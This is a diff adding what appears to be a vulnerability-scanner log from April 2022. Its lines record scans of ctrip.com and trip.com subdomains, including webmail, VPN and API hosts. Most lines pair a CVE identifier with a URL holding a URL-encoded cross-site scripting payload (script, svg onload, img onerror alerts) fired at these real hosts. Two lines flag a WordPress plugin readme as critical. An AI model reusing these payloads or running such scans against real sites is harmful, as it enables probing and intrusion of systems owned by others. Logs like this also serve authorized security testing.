@@ -1,0 +1,16 @@
+[2022-04-19 03:13:28] [CVE-2020-27982] [http] [medium] https://piao.ctrip.com/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+[2022-04-19 03:24:54] [CVE-2020-29395] [http] [medium] https://piao.ctrip.com/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E
+[2022-04-19 03:27:31] [CVE-2020-8512] [http] [medium] https://piao.ctrip.com/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
+[2022-04-19 03:30:27] [CVE-2020-28351] [http] [medium] http://apiproxy.ctrip.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[2022-04-19 03:30:43] [CVE-2020-28351] [http] [medium] http://fra-api.trip.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[2022-04-19 03:31:46] [CVE-2020-28351] [http] [medium] http://tp-api.ctrip.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[2022-04-19 03:32:00] [CVE-2020-28351] [http] [medium] https://apiproxy.ctrip.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+[2022-04-19 03:41:18] [CVE-2008-2398] [http] [medium] https://piao.ctrip.com/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+[2022-04-19 03:47:31] [CVE-2018-13380] [http] [medium] https://fqmvpn.ctrip.com/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+[2022-04-19 03:47:47] [CVE-2018-13380] [http] [medium] https://fqmvpn.ctrip.com/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
+[2022-04-19 03:48:04] [CVE-2018-13380] [http] [medium] https://oymvpn.ctrip.com/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+[2022-04-19 03:48:04] [CVE-2018-13380] [http] [medium] https://piao.ctrip.com/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+[2022-04-19 03:48:23] [CVE-2018-13380] [http] [medium] https://oymvpn.ctrip.com/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
+[2022-04-19 03:56:42] [CVE-2020-14413] [http] [medium] https://piao.ctrip.com/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+[2022-04-19 04:01:31] [CVE-2020-35489] [http] [critical] http://tech.ctrip.com/wp-content/plugins/contact-form-7/readme.txt [5.3]
+[2022-04-19 04:02:04] [CVE-2020-35489] [http] [critical] https://tech.ctrip.com/wp-content/plugins/contact-form-7/readme.txt [5.3]
